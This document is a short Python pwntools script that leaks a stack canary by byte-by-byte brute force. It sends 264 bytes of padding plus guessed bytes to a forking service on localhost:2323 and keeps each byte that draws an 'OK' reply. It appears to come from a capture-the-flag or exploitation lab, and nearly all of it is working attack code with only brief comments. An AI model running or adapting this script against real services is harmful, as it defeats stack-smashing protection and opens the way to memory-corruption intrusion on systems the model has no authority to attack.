#!/usr/bin/env python3

import os
from pwn import *


def leak(padding=b'', description='canary', length=8, host='localhost', port=2323):

    leak_val = b''
    reply = b''

    while(len(leak_val) < length):  # length bytes for leak_val
        for j in range(256):  # all values for a byte
            r = remote(host, port)
            # Maybe add short sleep here: otherwise, the child processes on the server are spawned so quickly that the main memory runs full
            # sleep(0.07)

            log.debug(
                f'Sending {description.lower()} 0x{(leak_val + p8(j))[::-1].hex()}')
            r.send(padding + leak_val + p8(j))  # Send next attempt

            try:
                # Timeout might have to be adjusted
                reply = r.recvuntil('OK', timeout=0.01)
            except EOFError:  # Error occured => continue with next byte
                continue
            finally:
                r.close()

            if b'OK' in reply:
                # 'OK' was received (try was successful) => found byte
                reply = b''
                log.info(f'Found next {description.lower()} byte: {hex(j)}')
                leak_val += p8(j)
                log.info(
                    f'{description.capitalize()}: 0x{leak_val[::-1].hex()}')
                break

            if j == 255:
                # Run through complete for loop without finding a byte => danger to fall into infinite while loop
                log.error('Trapped in infinite loop')

    return leak_val


if __name__ == "__main__":
    # context.log_level = 'debug'
    padding = b'A' * 264

    if 'PROFILE' in os.environ.keys():
        log.info('Profiler enabled')
        import cProfile
        cProfile.run(f'leak(padding={padding})', sort='tottime')
    else:
        log.info('Profiler disabled')
        leak(padding=padding)
